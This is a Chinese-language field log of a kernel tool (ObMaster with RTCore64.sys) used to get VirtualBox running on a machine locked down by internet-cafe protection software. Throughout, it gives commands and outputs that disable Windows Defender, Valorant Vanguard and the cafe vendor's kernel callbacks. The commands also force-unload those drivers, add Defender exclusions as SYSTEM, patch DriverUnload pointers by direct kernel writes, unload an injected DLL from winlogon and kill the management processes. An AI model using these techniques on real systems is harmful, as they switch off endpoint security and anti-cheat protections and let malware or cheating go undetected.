   看 evil handle 是否真的还存在，如果存在看它来自哪个 PID
3. **考虑 `/make-ppl` 方案**：即使有 evil handle，PPL 可以阻止 System 对 VBox 开 ALL_ACCESS

---

## 第六次实战（2026-04-12）

### 环境

- Windows 10 22H2 build 19045（服务器）
- VirtualBox 7.2.6r172322，Ubuntu VM
- ObMaster.exe + RTCore64.sys 位于 `E:\ObMaster\build\`

### 已加载驱动（初始状态）

| 驱动 | 基址 | 备注 |
|------|------|------|
| ksafecenter64.sys | FFFFF800B4E90000 | 云更新保护驱动 |
| kshutdown64.sys | — | 云更新 APC 注入驱动 |
| kboot64.sys | — | 云更新 PnP/CmCallback 驱动 |
| WdFilter.sys | — | Windows Defender |
| VBoxSup.sys | — | VBox 支撑驱动 |
| vgk.sys | — | Valorant Vanguard 反作弊 |
| RTCore64.sys | — | 工具后端 |

### 初始状态

VBox 启动失败，exit code `0xC0000409`，VBoxHardening.log 记录 evil handle：

```
Found evil handle to budding VM process:
  pid=0x4 (System)  h=0xdf4c  acc=0x1fffff  type=process (7)
Integrity error (0xe986f166/-3738)
ExitCode=0xc0000409 (3855 ms)
```

---

### Step 1：MmPteBase 获取

```
ObMaster /ptebase --method 10
  MmPteBase = 0xFFFFF60000000000 (imm64 in .text)
```

全方法扫描额外发现 Method 12（驱动 .data 扫描，RTKVHD64.sys）给出 `0xFFFF8B8000000000`。

**PTE walk 验证：**

| 方法 | 值 | PTE walk 结果 |
|------|-----|--------------|
| Method 10 | `0xFFFFF60000000000` | PML4E/PDPTE Present，PDE Not Present |
| Method 12 | `0xFFFF8B8000000000` | PML4E 即 Not Present |

Method 10 的 PTE walk 在 PDE 层停止，但这不代表值错误——MmPteBase 是 PTE 计算基址，
自身地址不需要完整页表映射。sp-test 用 Method 10 的值三个 Stage 全 PASS，确认正确。

状态：✅ MmPteBase = `0xFFFFF60000000000`（Method 10 确认可靠）

---

### Step 2：sp-test 验证 PTE 可写

```
ObMaster /sp-test 0xFFFFF800B4E90000   (ksafecenter64.sys 基址)

[Stage 0]  VBS/HVCI: 全部 no
[Stage 1]  PTE VA=0xFFFFF67C005A7480  value=0x89000001724A3021
           Page PA=0x1724A3000  Flags: PRESENT R NX K
           [PASS]  4KB page confirmed
[Stage 2]  No-op PTE write → readback OK
           [PASS]  PTE write path works
[Stage 3]  Shadow page swap: original byte=0x4D
           Shadow PA=0x55C2CC000  swap → verify → restore → verify
           [PASS]  PTE swap mechanism works
```

状态：✅ safepatch 完全可用

---

### Step 3：ksafecenter64 物理地址确认

```
ObMaster /v2p 0xFFFFF800B4E90000
  VA: 0xFFFFF800B4E90000  →  PA: 0x1724A3000  (4KB page)
```

状态：✅

---

### Phase 1：拆回调

#### ① ② CmCallback — 定位失败

```
ObMaster /notify registry --kill ksafecenter64
  [!] Failed to locate CmpCallBackVector

ObMaster /notify registry --kill kboot64
  [!] Failed to locate CmpCallBackVector
```

Debug 输出（`/debug /notify registry`）：

```
FindCmpCallBackVector: 7 candidates, validating...
  FFFFF8007F0482D8 — failed validation
  FFFFF8007F0482E0 — failed validation
  FFFFF8007F0482F8 — slot[99] fn=FFFFAC0B9C5CF048 firstByte=0x90 (not prologue) → failed
  FFFFF8007F0482F0 — failed validation
  FFFFF8007F0F4210 — slot[4] fn=FFFFAC0B8A6C0B80 firstByte=0x04 (not prologue) → failed
  FFFFF8007F047E00 — failed validation
  FFFFF8007F0122F0 — failed validation
no valid array found
```

**根因：** `IsValidPrologue()` 不认 `0x90`（NOP 对齐填充）和 `0x04`（ADD AL, imm8），
导致含这些首字节的真实回调被拒，整个数组验证失败。

**待修复：** 放宽 `IsValidPrologue` 或改用 block 结构完整性验证替代函数首字节检查。

状态：❌ CmCallback 拆除失败

---

#### ③ ObCallback — ksafecenter64

```
ObMaster /obcb

[0] Process  Entry:FFFF890EC868ED00  Enabled:1  Ops:CREATE|DUPLICATE
     Pre : FFFFF8008341A2A0  WdFilter.sys +0x3a2a0
[1] Process  Entry:FFFF890ECDC7CAB0  Enabled:1  Ops:CREATE
     Pre : FFFFF800B4E978B8  ksafecenter64.sys +0x78b8
[2] Process  Entry:FFFF890EEB4D6610  Enabled:1  Ops:CREATE|DUPLICATE
     Pre : FFFFF8008B805A50  VBoxSup.sys +0x15a50
[3] Process  Entry:FFFF890EC8B57240  Enabled:1  Ops:CREATE|DUPLICATE
     Pre : FFFFF8009666C42C  vgk.sys +0xc42c

ObMaster /disable 0xFFFFF800B4E978B8
  [+] Disabled (Enabled=0, PreOp=0, PostOp=0)
```

状态：✅ ksafecenter64 ObCallback 已清零

---

#### ④-⑨ Notify Routines

**ImageNotify：**

```
ObMaster /notify image

[2] Slot:4  Fn: FFFFF80096612EF8  kshutdown64.sys +0x2ef8
[4] Slot:6  Fn: FFFFF800B4E96FAC  ksafecenter64.sys +0x6fac

ObMaster /ndisable 0xFFFFF800B4E96FAC   → [+] Disabled (slot zeroed)
ObMaster /ndisable 0xFFFFF80096612EF8   → [+] Disabled (slot zeroed)
```

**ProcessNotify：**

```
ObMaster /debug /notify process

10 个条目，其中 9 个指向 ntoskrnl.exe 自身，仅 1 个 <unknown>：

[2] CreateProcess   Slot:11  Block:FFFF890ECC6FC510
     Fn  : FFFFAC0B8D5EE080  <unknown> +0x0
     Code: 06 00 20 00 00 00 00 00 88 E0 5E 8D 0B AC FF FF
```

**`<unknown>` 分析：**
- Fn 地址 `FFFFAC0B8D5EE080` 在 paged pool 范围，不在任何已加载驱动地址空间内
- 首字节 `0x06`：x64 模式下非法指令（PUSH ES 仅 32 位有效），不是代码
- 后 8 字节 `0xFFFFAC0B8D5EE088` = 自身地址 +8，典型 LIST_ENTRY 自引用指针
- **结论：** 不是真正的回调函数，是 stale entry 或内核数据结构被误识别

其余 9 个 ntoskrnl 条目的 Code 字节也全是指针（非代码），
整个 ProcessNotify 数组中无任何云更新驱动（ksafecenter64/kshutdown64/kboot64/kcachec64）的条目。

状态：✅ ImageNotify（ksafecenter64 + kshutdown64）已清零
状态：✅ ProcessNotify 无云更新条目（已确认）

---

#### ⑩ MiniFilter

```
ObMaster /flt-detach ksafecenter64 C:
  [!] Filter 'ksafecenter64' not found in kernel list
```

状态：✅ 不需要处理

---

### Phase 1 完成后测试 VBox

```
VirtualBoxVM.exe --startvm Ubuntu
→ exit code 0xc0000409
→ VBoxHardening.log 未更新（同一份日志，错误不变）
```

evil handle 仍然存在。ObCallback 清零只阻止新的句柄拦截，
已存在的 handle 不会自动关闭，且 CmCallback 未拆、ProcessNotify 未确认清除，
kshutdown64 的 APC 注入可能仍在生效。

状态：❌ VBox 仍无法启动

---

### BSOD：CmCallback --kill 链表 unlink 错误（2026-04-12）

第六次实战期间执行 `/notify registry --kill ksafecenter64` 后蓝屏。

**根因：** Win10 19041+ 的 CmCallback 存储在 `CallbackListHead` 双向链表中，
每个节点布局为 `+0x00 Flink, +0x08 Blink, +0x20 Context, +0x28 Function`。
`--kill` 执行时直接 `Wr64(node, 0)` 将节点首 QWORD（即 Flink）写零，
**破坏了双向链表结构**。后续内核遍历 CallbackListHead 时读到 Flink=0，
触发访问违规。

**BSOD 详情：**
```
*** BugCheck 0x0000003B (SYSTEM_SERVICE_EXCEPTION)
P1: 0x00000000C0000005  (STATUS_ACCESS_VIOLATION)
P2: 0xFFFFF807578F3532  (Faulting RIP — p9rdr.sys，WSL 文件系统驱动)
Dump: C:\Windows\Minidump\041226-12046-01.dmp (347.4 MB)
时间: 2026-04-12 01:04:35
```

p9rdr.sys 是受害者——它执行注册表操作时触发了内核的 CmCallback 遍历，
读到损坏的链表节点 Flink=0 导致 0xC0000005。

**修复（commit 4c70007）：** 区分数组模式和链表模式：
- 数组模式（EX_CALLBACK slot）：`Wr64(slot, 0)` — 内核跳过 NULL slot，安全
- 链表模式（CallbackListHead node）：正确 unlink LIST_ENTRY：
  ```
  prev->Flink = next    // Wr64(blink + 0x00, flink)
  next->Blink = prev    // Wr64(flink + 0x08, blink)
  node->Function = 0    // Wr64(node + 0x28, 0) 防止并发调用
  ```
- 额外安全检查：Flink/Blink 不合法时拒绝操作

**验证：** 修复后对 ksafecenter64 执行 `--kill`，成功 unlink，系统稳定，
再次查询确认回调已从链表中移除（6 → 5 条目）。

---

### 当前阻塞与下一步

| 问题 | 状态 | 下一步 |
|------|------|--------|
| CmCallback --kill 链表 BSOD | ✅ | 已修复（LIST_ENTRY unlink，commit 4c70007） |
| CmCallback 定位失败 | ✅ | 已修复（IsValidPrologue 放宽 + CallbackListHead 链表遍历） |
| ProcessNotify `<unknown>` 归属不明 | ✅ | 确认为 stale entry（0x06 非法指令），非云更新驱动 |
| Phase 2 | ✅ | ksafecenter/kshutdown/kboot 卸载成功；kcachec 拒绝（次要） |
| Phase 3 | ✅ | kdisk 卸载成功；krestore/KScsiDisk 拒绝（磁盘驱动，DeviceObject 引用） |
| VBox 启动 | ❌ | evil handle 仍存在，见下方续 |

---

### 第六次实战续（Phase 2/3 执行 + 全面中和）

#### Phase 2：卸载保护驱动

**关键发现：** 服务名不带 64。`/force-stop ksafecenter64` 失败（STATUS_OBJECT_NAME_NOT_FOUND），
`/force-stop ksafecenter` 成功。`\Driver` 对象名也不带 64。

| 驱动文件 | 服务名 | /force-stop 结果 |
|----------|--------|-----------------|
| ksafecenter64.sys | `ksafecenter` | ✅ Driver unloaded successfully |
| kshutdown64.sys | `kshutdown` | ✅ Driver unloaded successfully |
| kboot64.sys | `kboot` | ✅ Driver unloaded successfully |
| kcachec64.sys | `kcachec` | ❌ STATUS_INVALID_DEVICE_REQUEST（DriverUnload 拒绝 stop） |

#### Phase 3：卸载非保护驱动

| 驱动文件 | 服务名 | 结果 |
|----------|--------|------|
| kdisk64.sys | `kdisk` | ✅ 卸载成功 |
| krestore64.sys | `krestore` | ❌ ControlService 1052（15 个 DeviceObject） |
| KScsiDisk64.sys | `KScsiDisk` | ❌ ControlService 1052（5 个 DeviceObject） |
| kantiarp64.sys | — | 未加载 |
| kpowershutdown64.sys | — | 未加载 |

#### WdFilter 处理

| 操作 | 结果 |
|------|------|
| Defender 排除规则（/runas system reg add） | ✅ 写入成功 |
| WdFilter ObCallback PreOp 清零 | ✅ Disabled |
| WdFilter LoadImage notify 清零 (+0x3ce80) | ✅ Disabled |
| WdFilter Thread notify [0] 清零 (+0x3da50) | ✅ Disabled |
| WdFilter Thread notify [1] 清零 (+0x3d830) | ✅ Disabled |

#### vgk.sys（Valorant Vanguard）处理

| 操作 | 结果 |
|------|------|
| ObCallback PreOp 清零 (Process + Thread) | ✅ Disabled |
| LoadImage notify 清零 (+0xbee4) | ✅ Disabled |
| /force-stop vgk | ✅ Driver unloaded successfully |

#### kshutdown64 APC 注入中和

| 操作 | 结果 |
|------|------|
| kshut64.dll 文件重命名（System32 + SysWOW64） | ✅ 三个文件全部 .bak |
| kshut64.dll 从 winlogon.exe 卸载（/wluninject） | ✅ FreeLibrary 成功 |
| /wlmon 确认 winlogon 无 kshut64.dll | ✅ 已消失 |

#### 云更新用户态进程中和

| 进程 | 路径 | 操作 |
|------|------|------|
| lwclient64.exe | B:\lwclient64\ | ✅ 文件重命名 + 进程终止 |
| kssd.exe | B:\lwclient64\ | ✅ 文件重命名 + 进程终止 |
| lwhardware64.exe | B:\lwclient64\ | ✅ 文件重命名 + 进程终止 |

杀进程后不再重生（可执行文件已重命名）。

#### 云更新驱动文件重命名

```
C:\Windows\System32\drivers\ksafecenter64.sys → .bak
C:\Windows\System32\drivers\kshutdown64.sys → .bak
C:\Windows\System32\drivers\kboot64.sys → .bak
C:\Windows\System32\drivers\kcachec64.sys → .bak
```

---

### 当前状态总结

| 层 | 内容 | 状态 |
|----|------|------|
| ksafecenter CmCallback | /notify registry --kill | ✅ 已拆 |
| kboot CmCallback | /notify registry --kill | ✅ 已拆 |
| ksafecenter ObCallback | /disable PreOp | ✅ 已禁用 |
| WdFilter ObCallback | /disable PreOp | ✅ 已禁用 |
| vgk ObCallback | /disable PreOp | ✅ 已禁用 + 驱动卸载 |
| ksafecenter ImageNotify | /ndisable +0x6fac | ✅ 已清零 |
| kshutdown ImageNotify | /ndisable +0x2ef8 | ✅ 已清零 |
| WdFilter ImageNotify | /ndisable +0x3ce80 | ✅ 已清零 |
| WdFilter Thread notify ×2 | /ndisable | ✅ 已清零 |
| vgk ImageNotify | /ndisable +0xbee4 | ✅ 已清零 |
| ProcessNotify | 无云更新条目 | ✅ 已确认 |
| MiniFilter | ksafecenter 未挂载 | ✅ 不需处理 |
| ksafecenter64.sys | /force-stop ksafecenter | ✅ 已卸载 |
| kshutdown64.sys | /force-stop kshutdown | ✅ 已卸载 |
| kboot64.sys | /force-stop kboot | ✅ 已卸载 |
| kcachec64.sys | /force-stop kcachec | ❌ 拒绝卸载（次要） |
| kshut64.dll 文件 | 重命名 .bak | ✅ 中和 |
| kshut64.dll in winlogon | /wluninject | ✅ 已卸载 |
| 云更新用户态进程 | 文件重命名 + 杀进程 | ✅ 已中和 |
| 驱动 .sys 文件 | 重命名 .bak | ✅ 防重载 |
| **evil handle** | pid=4 PROCESS_ALL_ACCESS | **❌ 仍存在** |
| **VBox 启动** | exit 0xc0000409 ~3200-3700ms | **❌ 未达成** |

### 进一步排查

#### WdFilter 完全停止

```
ObMaster /runas system "net stop WdFilter /y"
sc query WdFilter → STATE: 1 STOPPED
```

结果：✅ WdFilter 完全停止。evil handle 仍存在 — **WdFilter 不是来源**。

#### 剩余云更新驱动卸载尝试

kcachec64、krestore64、KScsiDisk64 三个驱动仍在内存（kcachec Stopped，另外两个活跃）。
尝试手动 `/wr64` 将 DriverUnload 覆盖为 ret stub（0xFFFFF8077B602660），再 `/force-stop`：

| 驱动 | DRIVER_OBJECT+0x68 | /wr64 | /force-stop 结果 |
|------|-------------------|-------|-----------------|
| kcachec | 0xFFFF988CB9F5CE78 | ✅ 写入成功 | ❌ STATUS_INVALID_DEVICE_REQUEST（DeviceObject 引用阻止） |
| krestore | 0xFFFF988CB995E4E8 | ✅ 写入成功 | ❌ 同上（15 个 DeviceObject） |
| KScsiDisk | 0xFFFF988CB9CE0D78 | ✅ 写入成功 | ❌ 同上（5 个 DeviceObject） |

**根因：** NtUnloadDriver → IopUnloadDriver 在 DeviceObject 引用计数不为零时，
在调用 DriverUnload 之前就返回 STATUS_INVALID_DEVICE_REQUEST。ret stub patch 无效。

#### Notify 回调排查

`/debug /notify process` 详细输出确认：所有 bad entry 均指向 ntoskrnl 范围或垃圾数据，
无任何条目指向 KScsiDisk64（0xFFFFF80781E80000）或 kcachec64（0xFFFFF80782720000）地址范围。

`/notify image` 仅剩 ahcache.sys（系统组件）。

**结论：KScsiDisk64 和 kcachec64 的 Process/Image notify 未在当前环境中注册。**
ppm 静态分析显示它们有注册能力，但实际运行时可能未执行注册（依赖服务端配置或特定条件）。

---

### 未解问题

**所有已知的云更新内核回调、驱动、用户态进程、DLL 注入均已中和，
WdFilter 已完全停止，所有 Notify 数组中无云更新条目，
但 evil handle (pid=4, acc=0x1fffff) 仍在每次 VBox 启动时出现。**

**已排除的来源：**
- ksafecenter64 ObCallback — 已禁用
- ksafecenter64 CmCallback — 已 unlink
- ksafecenter64/kshutdown64 ImageNotify — 已清零
- kboot64 CmCallback — 已 unlink
- WdFilter ObCallback/ImageNotify/ThreadNotify — 已禁用 + 服务停止
- vgk.sys — 已完全卸载
- kshutdown64 — 已卸载 + kshut64.dll 中和
- 云更新用户态进程 — 已终止 + 文件重命名
- ProcessNotify 数组 — 无云更新条目（debug 确认）
- ImageNotify 数组 — 仅 ahcache.sys

**可能的残留来源：**
1. **kcachec64/krestore64/KScsiDisk64 代码仍驻留内存**，虽然 Notify 数组中无条目，
   但可能通过非标准路径（内部线程、定时器等）在进程创建时开 handle
2. **Windows 内核自身行为** — 进程创建时 System 默认获得 ALL_ACCESS handle，
   VBoxSup hardening 将其视为 evil（第五次实战的逆向分析结论支持此假设）
3. **其他第三方驱动** — cpuz160_x64.sys、OpenHardwareMonitorLib.sys

### 下一步方案

1. **`/make-ppl`**：给 VBox 进程设置 PPL 保护，阻止 System 对其开 ALL_ACCESS handle
2. **`/handle-scan 4 --target-pid <vboxpid> --close --spin`**：在 VBox 启动时实时关闭 evil handle

